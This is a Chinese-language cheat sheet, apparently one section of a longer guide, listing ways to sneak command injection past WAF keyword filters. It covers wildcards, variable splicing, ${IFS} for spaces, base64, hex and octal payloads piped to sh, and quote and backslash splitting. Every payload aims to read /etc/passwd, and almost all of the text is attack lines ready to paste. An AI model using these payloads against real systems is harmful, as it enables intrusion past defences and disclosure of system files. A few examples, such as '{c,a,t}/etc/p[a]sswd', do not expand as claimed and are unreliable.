# 命令注入绕过

### 5.1 通配符绕过

利用Shell通配符（glob）绕过对命令关键字的检测：

```bash
# 原始命令
cat /etc/passwd

# 通配符绕过
cat /etc/pa??wd
cat /etc/pa*wd
cat /etc/pass*

# 利用问号匹配任意单字符
/bin/cat /etc/pa??wd

# 利用方括号字符集
cat /etc/p[a]sswd
cat /etc/p[a-z]sswd
```

**原理：** Shell通配符在执行前由Shell展开为实际文件名，WAF检测的是通配符模式而非展开后的命令，从而绕过关键字检测。

### 5.2 变量替换

利用Shell变量特性构造命令：

```bash
# 变量拼接
a=ca;b=t;$a$b /etc/passwd

# 变量替换
${IFS}替代空格: cat${IFS}/etc/passwd

# 变量截取
a=cat;echo ${a:0:2}  → ca

# 反引号执行
`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`  → cat /etc/passwd

# $()执行
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
```

### 5.3 编码绕过

```bash
# Base64编码
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
# Y2F0IC9ldGMvcGFzc3dk = cat /etc/passwd

# Hex编码
echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh

# Octal编码
echo -e '\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144' | sh

# 利用printf
printf '\x63\x61\x74' | sh  → cat
```

### 5.4 空格绕过

```bash
# IFS变量替代空格
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat$'\x20'/etc/passwd

# 花括号扩展
{cat,/etc/passwd}  → cat /etc/passwd

# 重定向符
cat</etc/passwd
cat<>/etc/passwd

# Tab键替代
cat%09/etc/passwd  (\t在URL中为%09)

# $IFS组合
cat${IFS}${IFS}/etc/passwd
```

### 5.5 引号绕过

```bash
# 单引号拼接
c'a't /etc/passwd
c"a"t /etc/passwd

# 反斜杠拼接
c\at /etc/passwd
\c\a\t /etc/passwd

# 混合使用
c''at /etc/passwd
c'a''t /etc/passwd

# 特殊字符组合
ca\t$()\ /etc/passwd
```

### 5.6 综合命令注入绕过示例

```bash
# 目标: 执行 cat /etc/passwd
# 假设WAF拦截: cat, /etc/passwd, 空格

# 绕过1: 变量+通配符+IFS
a=ca;b=t;$a$b$IFS/etc/pa??wd

# 绕过2: 编码+引号
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# 绕过3: 反斜杠+花括号
\c\a\t</etc/passwd
{c,a,t}/etc/p[a]sswd

# 绕过4: 变量+编码
p=/etc/passwd;cat$IFS$p
```
